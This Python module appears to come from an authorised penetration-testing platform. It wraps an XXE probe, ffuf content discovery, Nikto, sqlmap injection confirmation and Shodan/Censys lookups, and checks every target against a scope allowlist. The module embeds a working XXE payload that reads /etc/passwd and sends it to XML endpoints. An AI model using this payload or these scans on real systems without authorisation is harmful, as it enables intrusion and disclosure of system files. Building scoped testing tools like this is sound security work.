from __future__ import annotations

import json
import os
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Any, Callable
from urllib.parse import urlparse

import httpx as httpx_client

from api.app.services.runs import target_value_is_allowed
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

CONTENT_DISCOVERY_RESULTS_ARTIFACT_NAME = "content-discovery-results.json"
NIKTO_RESULTS_ARTIFACT_NAME = "nikto-results.json"
SQLMAP_RESULTS_ARTIFACT_NAME = "sqlmap-results.json"
EXTERNAL_OSINT_RESULTS_ARTIFACT_NAME = "external-osint-results.json"
XXE_RESULTS_ARTIFACT_NAME = "xxe-results.json"

DEFAULT_CONTENT_WORDS = (
    "admin",
    "api",
    "backup",
    "config",
    "debug",
    "login",
    "old",
    "private",
    "server-status",
    "test",
)

XXE_DIRECT_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aegispt [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<aegispt><probe>&xxe;</probe></aegispt>
"""

CommandRunner = Callable[..., subprocess.CompletedProcess[str]]


def _run_command(command: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
    return subprocess.run(command, **kwargs)


def _json_artifact(name: str, payload: dict[str, Any], *, kind: str = "runner-results") -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind=kind,
    )


def _scope_values(scope_allowlist: dict[str, Any], keys: tuple[str, ...]) -> list[str]:
    values: list[str] = []
    for key in keys:
        raw = scope_allowlist.get(key)
        if isinstance(raw, list):
            values.extend(str(item).strip() for item in raw if str(item).strip())
    return values


def _url_host(value: str) -> str:
    parsed = urlparse(value if "://" in value else f"//{value}")
    return str(parsed.hostname or "").strip().lower()


def _target_within_scope(scope_allowlist: dict[str, Any] | None, target: str) -> bool:
    scope = scope_allowlist or {}
    if not scope:
        return True

    candidate = normalize_http_target(target)
    candidate_host = _url_host(candidate)
    if not candidate_host:
        return False

    broad_values = _scope_values(scope, ("domains", "subdomains", "hosts", "ip_addresses"))
    if any(target_value_is_allowed({"targets": [value]}, candidate) for value in broad_values):
        return True

    url_constraints = [
        normalize_http_target(value)
        for value in _scope_values(scope, ("urls", "api_base_urls", "targets"))
        if _url_host(value) == candidate_host
    ]
    if not url_constraints:
        return target_value_is_allowed(scope, candidate)

    candidate_path = urlparse(candidate).path or "/"
    for raw_allowed in url_constraints:
        allowed = urlparse(raw_allowed)
        allowed_path = allowed.path or "/"
        if allowed_path == "/" or candidate_path == allowed_path or candidate_path.startswith(allowed_path.rstrip("/") + "/"):
            return True
    return False


def _approved_web_targets(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None,
) -> list[str]:
    normalized: list[str] = []
    seen: set[str] = set()
    for target in targets:
        if not str(target or "").strip():
            continue
        candidate = normalize_http_target(str(target).strip())
        if not _target_within_scope(scope_allowlist, candidate):
            raise ValueError(f"target outside scope: {candidate}")
        if candidate not in seen:
            seen.add(candidate)
            normalized.append(candidate)
    if not normalized:
        raise ValueError("at least one target is required")
    return normalized


def _finding(
    *,
    title: str,
    severity: str,
    target: str,
    summary: str,
    tags: list[str],
    extra: dict[str, Any] | None = None,
) -> dict[str, Any]:
    return {
        "title": title,
        "severity": severity,
        "target": target,
        "summary": summary,
        "methodology_tags": list(dict.fromkeys(tags)),
        **({"evidence": extra} if extra else {}),
    }


def _content_discovery_severity(status_code: int, url: str) -> str:
    lowered = url.lower()
    if status_code in {401, 403} or any(token in lowered for token in ("admin", "backup", "config")):
        return "medium"
    if status_code in {500, 502, 503}:
        return "low"
    return "info"


def _write_default_wordlist(directory: Path) -> Path:
    path = directory / "aegispt-content-words.txt"
    path.write_text("\n".join(DEFAULT_CONTENT_WORDS) + "\n", encoding="utf-8")
    return path


def _content_wordlist_path(configured_path: str | None, directory: Path) -> Path:
    if configured_path:
        candidate = Path(configured_path).expanduser()
        if candidate.exists():
            return candidate
    for candidate in (
        Path("/usr/share/wordlists/dirb/common.txt"),
        Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
    ):
        if candidate.exists():
            return candidate
    return _write_default_wordlist(directory)


def _xml_endpoint_hints_from_evidence(raw_items: Any) -> list[str]:
    items = raw_items if isinstance(raw_items, list) else []
    endpoints: list[str] = []
    for item in items:
        if isinstance(item, str):
            if item.strip():
                endpoints.append(item.strip())
            continue
        if not isinstance(item, dict):
            continue
        url = str(item.get("url") or item.get("target") or item.get("endpoint") or "").strip()
        if not url:
            continue
        haystack = " ".join(
            str(value or "")
            for value in (
                item.get("content_type"),
                item.get("request_content_type"),
                item.get("response_content_type"),
                item.get("method"),
                item.get("request_body"),
                item.get("body"),
            )
        ).lower()
        path = urlparse(url).path.lower()
        if (
            "application/xml" in haystack
            or "text/xml" in haystack
            or "<?xml" in haystack
            or path.endswith((".xml", ".svg"))
        ):
            endpoints.append(url)
    return endpoints


def _candidate_xml_endpoints(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None,
    xml_endpoints: list[dict[str, Any] | str] | None = None,
    evidence_records: list[dict[str, Any] | str] | None = None,
) -> list[str]:
    candidates: list[str] = []
    candidates.extend(_xml_endpoint_hints_from_evidence(xml_endpoints or []))
    candidates.extend(_xml_endpoint_hints_from_evidence(evidence_records or []))
    candidates.extend(_approved_web_targets(targets, scope_allowlist=scope_allowlist))

    normalized: list[str] = []
    seen: set[str] = set()
    for raw_candidate in candidates:
        candidate = normalize_http_target(str(raw_candidate).strip())
        if not _target_within_scope(scope_allowlist, candidate):
            raise ValueError(f"XML endpoint outside scope: {candidate}")
        if candidate not in seen:
            seen.add(candidate)
            normalized.append(candidate)
    if not normalized:
        raise ValueError("xxe-probe requires at least one in-scope XML-capable target")
    return normalized


def _xxe_direct_file_read_detected(response_text: str) -> bool:
    lowered = response_text.lower()
    return bool(
        "root:x:0:0:" in lowered
        or re.search(r"(?m)^[a-z0-9_-]+:x:\d+:\d+:", response_text)
        or ("/bin/" in lowered and "daemon:" in lowered)
    )


def _xxe_direct_finding(endpoint: str, response_text: str) -> dict[str, Any]:
    evidence_excerpt = response_text[:1200]
    return _finding(
        title="XXE - File Read Possible (Direct)",
        severity="critical",
        target=endpoint,
        summary=(
            "The approved XML endpoint echoed Unix password-file markers after a "
            "read-only external entity probe, indicating direct XML External Entity file-read exposure."
        ),
        tags=["xxe", "xml", "owasp-wstg", "input_validation"],
        extra={
            "probe_type": "direct-file-read",
            "file_uri": "file:///etc/passwd",
            "matched_marker": "passwd-style-account-line",
            "response_excerpt": evidence_excerpt,
        },
    )


def _xxe_oob_findings(
    *,
    endpoint: str,
    oob_confirmation_refs: list[dict[str, Any]] | None,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    refs = oob_confirmation_refs if isinstance(oob_confirmation_refs, list) else []
    for ref in refs:
        if not isinstance(ref, dict):
            continue
        ref_endpoint = str(ref.get("endpoint") or ref.get("target") or endpoint).strip()
        if ref_endpoint and ref_endpoint != endpoint:
            continue
        token = str(ref.get("token") or ref.get("interaction_id") or "oob-interaction").strip()
        findings.append(
            _finding(
                title="XXE - Blind Out-of-Band Detected",
                severity="critical",
                target=endpoint,
                summary=(
                    "Out-of-band interaction evidence was provided for an approved XML endpoint, "
                    "indicating blind XML External Entity resolution."
                ),
                tags=["xxe", "xml", "oob", "owasp-wstg", "input_validation"],
                extra={"probe_type": "blind-oob", "interaction_ref": token, "source": "provided-oob-evidence"},
            )
        )
    return findings


def execute_xxe_probe(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    xml_endpoints: list[dict[str, Any] | str] | None = None,
    evidence_records: list[dict[str, Any] | str] | None = None,
    oob_confirmation_refs: list[dict[str, Any]] | None = None,
    timeout_seconds: float = 30.0,
    client_factory: Callable[..., Any] = httpx_client.Client,
) -> RunnerExecution:
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")
    endpoints = _candidate_xml_endpoints(
        targets,
        scope_allowlist=scope_allowlist,
        xml_endpoints=xml_endpoints,
        evidence_records=evidence_records,
    )

    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0
    headers = {"Content-Type": "application/xml", "Accept": "application/xml,text/xml,text/plain,*/*"}

    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
        for endpoint in endpoints:
            try:
                response = client.post(endpoint, content=XXE_DIRECT_PAYLOAD.encode("utf-8"), headers=headers)
                response_text = response.text or ""
                detected = _xxe_direct_file_read_detected(response_text)
                result = {
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "probe_type": "direct-file-read",
                    "detected": detected,
                    "content_type": response.headers.get("content-type", ""),
                    "response_excerpt": response_text[:1200],
                }
                results.append(result)
                if detected:
                    findings.append(_xxe_direct_finding(endpoint, response_text))
            except httpx_client.HTTPError as exc:
                exit_code = 1
                stderr_lines.append(f"{endpoint}: {exc}")
                results.append({"endpoint": endpoint, "probe_type": "direct-file-read", "status": "error", "error": str(exc)})
            findings.extend(_xxe_oob_findings(endpoint=endpoint, oob_confirmation_refs=oob_confirmation_refs))

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {
            "endpoint_count": len(endpoints),
            "finding_count": len(findings),
            "direct_file_read_count": sum(1 for result in results if result.get("detected")),
            "dos_payloads_sent": 0,
        },
        "safety": {
            "dos_payloads_sent": False,
            "ssrf_chaining": False,
            "payload_family": "read-only-file-uri",
        },
    }
    return RunnerExecution(
        tool="xxe-probe",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.xxe:v1",
            "tool_version": "httpx-python",
            "finding_count": len(findings),
            "endpoint_count": len(endpoints),
            "dos_payloads_sent": False,
        },
        artifacts=[_json_artifact(XXE_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def execute_content_discovery(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    binary: str = "ffuf",
    wordlist_path: str | None = None,
    rate_limit: int = 2,
    timeout_seconds: float = 60.0,
    command_runner: CommandRunner | None = None,
) -> RunnerExecution:
    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
    if rate_limit <= 0:
        raise ValueError("rate_limit must be greater than zero")
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    runner = command_runner or _run_command
    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with tempfile.TemporaryDirectory(prefix="aegispt-content-discovery-") as tmp:
        tmp_path = Path(tmp)
        selected_wordlist = _content_wordlist_path(wordlist_path, tmp_path)
        for index, target in enumerate(normalized_targets):
            output_path = tmp_path / f"ffuf-{index}.json"
            command = [
                binary,
                "-u",
                f"{target.rstrip('/')}/FUZZ",
                "-w",
                str(selected_wordlist),
                "-of",
                "json",
                "-o",
                str(output_path),
                "-rate",
                str(rate_limit),
                "-t",
                str(max(1, min(rate_limit, 8))),
                "-timeout",
                str(max(1, int(timeout_seconds))),
                "-noninteractive",
            ]
            try:
                process = runner(
                    command,
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=max(timeout_seconds, 5.0),
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                exit_code = 1
                stderr_lines.append(f"{target}: {exc}")
                results.append({"target": target, "status": "error", "error": str(exc)})
                continue

            if process.returncode not in {0, 1}:
                exit_code = max(exit_code, process.returncode)
            if process.stderr:
                stderr_lines.append(process.stderr.strip())

            payload: dict[str, Any] = {}
            if output_path.exists():
                try:
                    payload = json.loads(output_path.read_text(encoding="utf-8"))
                except (json.JSONDecodeError, OSError) as exc:
                    stderr_lines.append(f"{target}: unable to parse ffuf output: {exc}")

            raw_hits = payload.get("results", []) if isinstance(payload, dict) else []
            target_hits: list[dict[str, Any]] = []
            for raw_hit in raw_hits if isinstance(raw_hits, list) else []:
                if not isinstance(raw_hit, dict):
                    continue
                url = str(raw_hit.get("url") or "").strip()
                if not url or not _target_within_scope(scope_allowlist, url):
                    continue
                status_code = int(raw_hit.get("status") or raw_hit.get("status_code") or 0)
                if status_code not in {200, 201, 202, 203, 204, 301, 302, 307, 308, 401, 403}:
                    continue
                hit = {
                    "url": url,
                    "status_code": status_code,
                    "length": raw_hit.get("length"),
                    "words": raw_hit.get("words"),
                    "lines": raw_hit.get("lines"),
                }
                target_hits.append(hit)
                findings.append(
                    _finding(
                        title="Hidden Endpoint Discovered",
                        severity=_content_discovery_severity(status_code, url),
                        target=url,
                        summary=(
                            f"Content discovery found {url} returning HTTP {status_code} "
                            "inside the approved web root."
                        ),
                        tags=["content-discovery", "owasp-wstg", "configuration"],
                        extra=hit,
                    )
                )
            results.append(
                {
                    "target": target,
                    "status": "ok" if process.returncode in {0, 1} else "error",
                    "command": command[:],
                    "hit_count": len(target_hits),
                    "hits": target_hits,
                }
            )

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "finding_count": len(findings),
            "rate_limit": rate_limit,
        },
    }
    return RunnerExecution(
        tool="content-discovery",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.content_discovery:v1",
            "tool_version": binary,
            "finding_count": len(findings),
            "target_count": len(normalized_targets),
        },
        artifacts=[_json_artifact(CONTENT_DISCOVERY_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def _nikto_severity(message: str) -> str:
    lowered = message.lower()
    if any(token in lowered for token in ("cve-", "vulnerable", "shell", "rce", "remote code")):
        return "high"
    if any(token in lowered for token in ("outdated", "dangerous", "backup", "admin", "default")):
        return "medium"
    if any(token in lowered for token in ("header", "cookie", "x-frame", "x-content-type")):
        return "low"
    return "info"


def _nikto_items(payload: Any) -> list[dict[str, Any]]:
    if isinstance(payload, dict):
        for key in ("vulnerabilities", "items"):
            if isinstance(payload.get(key), list):
                return [item for item in payload[key] if isinstance(item, dict)]
        if isinstance(payload.get("hosts"), list):
            items: list[dict[str, Any]] = []
            for host in payload["hosts"]:
                if isinstance(host, dict):
                    host_items = host.get("vulnerabilities") or host.get("items") or []
                    if isinstance(host_items, list):
                        items.extend(item for item in host_items if isinstance(item, dict))
            return items
    if isinstance(payload, list):
        return [item for item in payload if isinstance(item, dict)]
    return []


def execute_nikto_scan(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    binary: str = "nikto",
    timeout_seconds: float = 120.0,
    command_runner: CommandRunner | None = None,
) -> RunnerExecution:
    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    runner = command_runner or _run_command
    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with tempfile.TemporaryDirectory(prefix="aegispt-nikto-") as tmp:
        tmp_path = Path(tmp)
        for index, target in enumerate(normalized_targets):
            output_path = tmp_path / f"nikto-{index}.json"
            command = [
                binary,
                "-host",
                target,
                "-Format",
                "json",
                "-output",
                str(output_path),
                "-nointeractive",
                "-ask",
                "no",
            ]
            try:
                process = runner(
                    command,
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=max(timeout_seconds, 5.0),
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                exit_code = 1
                stderr_lines.append(f"{target}: {exc}")
                results.append({"target": target, "status": "error", "error": str(exc)})
                continue

            if process.returncode not in {0, 1}:
                exit_code = max(exit_code, process.returncode)
            if process.stderr:
                stderr_lines.append(process.stderr.strip())

            payload: Any = {}
            if output_path.exists():
                try:
                    payload = json.loads(output_path.read_text(encoding="utf-8"))
                except (json.JSONDecodeError, OSError) as exc:
                    stderr_lines.append(f"{target}: unable to parse nikto output: {exc}")

            items = _nikto_items(payload)
            target_findings: list[dict[str, Any]] = []
            for item in items:
                message = str(
                    item.get("msg")
                    or item.get("message")
                    or item.get("description")
                    or item.get("text")
                    or ""
                ).strip()
                if not message:
                    continue
                target_url = str(item.get("url") or item.get("target") or target).strip() or target
                if not _target_within_scope(scope_allowlist, target_url):
                    continue
                finding = _finding(
                    title="Web Server Configuration Finding",
                    severity=_nikto_severity(message),
                    target=target_url,
                    summary=message,
                    tags=["nikto", "owasp-wstg", "configuration"],
                    extra={
                        "nikto_id": item.get("id") or item.get("osvdb") or item.get("reference"),
                        "method": item.get("method"),
                    },
                )
                findings.append(finding)
                target_findings.append(finding)

            results.append(
                {
                    "target": target,
                    "status": "ok" if process.returncode in {0, 1} else "error",
                    "finding_count": len(target_findings),
                    "findings": target_findings,
                }
            )

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {"target_count": len(normalized_targets), "finding_count": len(findings)},
    }
    return RunnerExecution(
        tool="nikto",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.nikto:v1",
            "tool_version": binary,
            "finding_count": len(findings),
            "target_count": len(normalized_targets),
        },
        artifacts=[_json_artifact(NIKTO_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def _candidate_parameters(*values: Any) -> list[dict[str, str]]:
    candidates: list[dict[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for value in values:
        if not isinstance(value, list):
            continue
        for item in value:
            if not isinstance(item, dict):
                continue
            url = str(item.get("url") or item.get("target") or "").strip()
            parameter = str(item.get("parameter") or item.get("param") or "").strip()
            if not url or not parameter:
                continue
            source = str(item.get("source") or "explicit").strip() or "explicit"
            key = (url, parameter)
            if key in seen:
                continue
            seen.add(key)
            candidates.append({"url": normalize_http_target(url), "parameter": parameter, "source": source})
    return candidates


def execute_sqlmap_confirmation(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    injectable_parameters: list[dict[str, Any]] | None = None,
    zap_flagged_parameters: list[dict[str, Any]] | None = None,
    binary: str = "sqlmap",
    timeout_seconds: float = 180.0,
    command_runner: CommandRunner | None = None,
) -> RunnerExecution:
    candidates = _candidate_parameters(injectable_parameters, zap_flagged_parameters)
    if not candidates:
        raise ValueError(
            "sqlmap requires an explicit parameter target or ZAP-flagged injectable parameter"
        )
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    approved_target_set = set(_approved_web_targets(targets, scope_allowlist=scope_allowlist))
    for candidate in candidates:
        if not _target_within_scope(scope_allowlist, candidate["url"]):
            raise ValueError(f"target outside scope: {candidate['url']}")
        if approved_target_set and not any(candidate["url"].startswith(target.rstrip("/") + "/") or candidate["url"] == target for target in approved_target_set):
            raise ValueError(f"sqlmap parameter target is outside the queued approved web root: {candidate['url']}")

    runner = command_runner or _run_command
    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with tempfile.TemporaryDirectory(prefix="aegispt-sqlmap-") as tmp:
        output_dir = Path(tmp) / "sqlmap-output"
        output_dir.mkdir(parents=True, exist_ok=True)
        for candidate in candidates:
            command = [
                binary,
                "-u",
                candidate["url"],
                "-p",
                candidate["parameter"],
                "--batch",
                "--smart",
                "--level",
                "1",
                "--risk",
                "1",
                "--output-dir",
                str(output_dir),
                "--flush-session",
            ]
            try:
                process = runner(
                    command,
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=max(timeout_seconds, 5.0),
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                exit_code = 1
                stderr_lines.append(f"{candidate['url']}:{candidate['parameter']}: {exc}")
                results.append({**candidate, "status": "error", "error": str(exc)})
                continue

            if process.returncode not in {0, 1}:
                exit_code = max(exit_code, process.returncode)
            if process.stderr:
                stderr_lines.append(process.stderr.strip())
            stdout = process.stdout or ""
            vulnerable = bool(
                re.search(r"\bis vulnerable\b", stdout, re.IGNORECASE)
                or re.search(r"\bparameter\b.*\bappears to be\b.*\binjectable\b", stdout, re.IGNORECASE)
            )
            result = {
                **candidate,
                "status": "ok" if process.returncode in {0, 1} else "error",
                "vulnerable": vulnerable,
                "stdout_excerpt": stdout[-2000:],
            }
            results.append(result)
            if vulnerable:
                findings.append(
                    _finding(
                        title="Confirmed SQL Injection",
                        severity="high",
                        target=candidate["url"],
                        summary=(
                            f"sqlmap confirmed SQL injection behavior for parameter "
                            f"{candidate['parameter']} on an explicitly scoped URL."
                        ),
                        tags=["sqlmap", "owasp-wstg", "input_validation"],
                        extra={"parameter": candidate["parameter"], "source": candidate["source"]},
                    )
                )

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {"parameter_count": len(candidates), "finding_count": len(findings)},
    }
    return RunnerExecution(
        tool="sqlmap",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.sqlmap:v1",
            "tool_version": binary,
            "finding_count": len(findings),
            "parameter_count": len(candidates),
        },
        artifacts=[_json_artifact(SQLMAP_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def _host_or_domain(target: str) -> str:
    parsed = urlparse(str(target).strip() if "://" in str(target) else f"//{target}")
    return str(parsed.hostname or parsed.path or target).strip().rstrip("/").lower()


def _shodan_findings(target: str, payload: Any) -> list[dict[str, Any]]:
    if not isinstance(payload, dict):
        return []
    findings: list[dict[str, Any]] = []
    vulns = payload.get("vulns") if isinstance(payload.get("vulns"), dict) else {}
    for cve in sorted(vulns.keys()) if isinstance(vulns, dict) else []:
        findings.append(
            _finding(
                title="Public Vulnerability Exposure",
                severity="high",
                target=target,
                summary=f"Shodan reports {cve} for this approved target.",
                tags=["external-osint", "shodan", "configuration"],
                extra={"cve": cve, "source": "shodan"},
            )
        )
    services = payload.get("data") if isinstance(payload.get("data"), list) else []
    for service in services:
        if not isinstance(service, dict):
            continue
        port = service.get("port")
        product = str(service.get("product") or service.get("server") or "").strip()
        findings.append(
            _finding(
                title="Public Service Exposure",
                severity="info",
                target=target,
                summary=(
                    f"Shodan reports public service exposure on port {port}"
                    + (f" ({product})." if product else ".")
                ),
                tags=["external-osint", "shodan", "information_gathering"],
                extra={"port": port, "product": product or None, "source": "shodan"},
            )
        )
    return findings


def _censys_findings(target: str, payload: Any) -> list[dict[str, Any]]:
    if not isinstance(payload, dict):
        return []
    results = payload.get("result", {}).get("hits") if isinstance(payload.get("result"), dict) else payload.get("hits")
    if not isinstance(results, list):
        return []
    findings: list[dict[str, Any]] = []
    for hit in results:
        if not isinstance(hit, dict):
            continue
        services = hit.get("services") if isinstance(hit.get("services"), list) else []
        for service in services:
            if not isinstance(service, dict):
                continue
            port = service.get("port")
            service_name = str(service.get("service_name") or service.get("transport_protocol") or "").strip()
            findings.append(
                _finding(
                    title="Public Service Exposure",
                    severity="info",
                    target=target,
                    summary=(
                        f"Censys reports public service exposure on port {port}"
                        + (f" ({service_name})." if service_name else ".")
                    ),
                    tags=["external-osint", "censys", "information_gathering"],
                    extra={"port": port, "service": service_name or None, "source": "censys"},
                )
            )
    return findings


def execute_external_osint_recon(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    shodan_api_key: str | None = None,
    censys_api_id: str | None = None,
    censys_api_secret: str | None = None,
    timeout_seconds: float = 20.0,
    client_factory=httpx_client.Client,
) -> RunnerExecution:
    normalized_targets = [_host_or_domain(target) for target in targets if str(target or "").strip()]
    normalized_targets = list(dict.fromkeys(target for target in normalized_targets if target))
    if not normalized_targets:
        raise ValueError("at least one target is required")
    if not shodan_api_key and not (censys_api_id and censys_api_secret):
        raise ValueError("external OSINT recon requires SHODAN_API_KEY or Censys API credentials")

    scope = scope_allowlist or {}
    for target in normalized_targets:
        if scope and not target_value_is_allowed(scope, target):
            raise ValueError(f"target outside scope: {target}")

    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
        for target in normalized_targets:
            target_result: dict[str, Any] = {"target": target, "sources": {}}
            if shodan_api_key:
                try:
                    shodan_response = client.get(
                        f"https://api.shodan.io/shodan/host/{target}",
                        params={"key": shodan_api_key},
                        headers={"Accept": "application/json"},
                    )
                    if shodan_response.status_code == 404:
                        shodan_payload: Any = {"data": []}
                    else:
                        shodan_response.raise_for_status()
                        shodan_payload = shodan_response.json()
                    target_result["sources"]["shodan"] = shodan_payload
                    findings.extend(_shodan_findings(target, shodan_payload))
                except (httpx_client.HTTPError, ValueError, json.JSONDecodeError) as exc:
                    stderr_lines.append(f"{target}: shodan lookup failed: {exc}")
                    target_result["sources"]["shodan_error"] = str(exc)

            if censys_api_id and censys_api_secret:
                try:
                    censys_response = client.get(
                        "https://search.censys.io/api/v2/hosts/search",
                        params={"q": target, "per_page": 10},
                        auth=(censys_api_id, censys_api_secret),
                        headers={"Accept": "application/json"},
                    )
                    censys_response.raise_for_status()
                    censys_payload = censys_response.json()
                    target_result["sources"]["censys"] = censys_payload
                    findings.extend(_censys_findings(target, censys_payload))
                except (httpx_client.HTTPError, ValueError, json.JSONDecodeError) as exc:
                    stderr_lines.append(f"{target}: censys lookup failed: {exc}")
                    target_result["sources"]["censys_error"] = str(exc)

            results.append(target_result)

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "finding_count": len(findings),
            "shodan_configured": bool(shodan_api_key),
            "censys_configured": bool(censys_api_id and censys_api_secret),
        },
    }
    return RunnerExecution(
        tool="external-osint",
        exit_code=0,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if not stderr_lines else "completed_with_errors",
            "runner_digest": "workers.web_depth.external_osint:v1",
            "tool_version": "shodan-censys-api",
            "finding_count": len(findings),
            "target_count": len(normalized_targets),
        },
        artifacts=[_json_artifact(EXTERNAL_OSINT_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )
